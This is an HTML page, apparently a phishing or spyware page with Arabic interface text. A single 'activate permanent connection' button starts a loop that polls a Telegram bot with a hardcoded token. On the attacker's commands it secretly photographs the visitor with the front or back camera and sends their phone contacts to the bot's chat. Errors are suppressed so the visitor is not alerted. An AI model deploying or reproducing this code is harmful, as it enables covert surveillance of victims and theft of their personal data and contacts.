<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>V8 - Persistent Control</title>
    <style>
        body { background: #000; color: #00ffcc; font-family: monospace; text-align: center; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .box { border: 1px solid #00ffcc; padding: 25px; border-radius: 15px; background: rgba(0,255,204,0.05); box-shadow: 0 0 20px #00ffcc; width: 90%; max-width: 400px; }
        .btn { background: #00ffcc; color: #000; border: none; padding: 15px; border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; }
        .flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; opacity: 0; pointer-events: none; }
        #v, #c { display: none; }
    </style>
</head>
<body>
    <div class="flash" id="f"></div>
    <div class="box">
        <h2>V8 CONTROL PANEL</h2>
        <p id="s">بانتظار مزامنة الأوامر...</p>
        <button class="btn" onclick="activateConnection()">تفعيل الاتصال الدائم ✅</button>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const TOKEN = "8367869004:AAEv2aO1zLLQ1n39BqG6hsZnlTBXXc6CLgY";
        const params = new URLSearchParams(window.location.search);
        const uid = params.get('id');

        // 1. وظيفة التقاط الصورة (بأعلى جودة ومنع السواد)
        async function capture(mode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode === 'back' ? "environment" : "user" } });
                const video = document.getElementById('v');
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 3000)); // انتظار الضبط

                document.getElementById('f').style.opacity = '1';
                const canvas = document.getElementById('c');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const photo = canvas.toDataURL('image/jpeg', 0.9);
                document.getElementById('f').style.opacity = '0';

                const blob = await (await fetch(photo)).blob();
                const fd = new FormData();
                fd.append('chat_id', uid);
                fd.append('photo', blob, 'v8.jpg');
                fd.append('caption', `✅ تم تنفيذ أمر التصوير المباشر (${mode})`);
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                stream.getTracks().forEach(t => t.stop());
            } catch (e) {}
        }

        // 2. وظيفة سحب الأسماء
        async function getContacts() {
            if ('contacts' in navigator) {
                try {
                    const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
                    let msg = "📇 سجل الأسماء المستخرج:\n";
                    contacts.forEach(c => msg += `👤 ${c.name}: ${c.tel}\n`);
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ chat_id: uid, text: msg.slice(0, 4000) })
                    });
                } catch (e) {}
            }
        }

        // 3. المستمع المستمر للأوامر (Persistent Listener)
        async function activateConnection() {
            if(!uid) return;
            document.getElementById('s').innerText = "🟢 الاتصال نشط.. بانتظار أوامرك";
            
            // إرسال تنبيه للبوت بفتح الاتصال
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${uid}&text=🟢 تم فتح قناة اتصال دائم مع الجهاز!`);

            setInterval(async () => {
                try {
                    const res = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1`);
                    const data = await res.json();
                    const lastCmd = data.result[0].message.text;

                    if (lastCmd === "/take_front") capture('front');
                    if (lastCmd === "/take_back") capture('back');
                    if (lastCmd === "/get_contacts") getContacts();
                } catch (e) {}
            }, 5000); // يفحص الأوامر كل 5 ثوانٍ
        }
    </script>
</body>
</html>
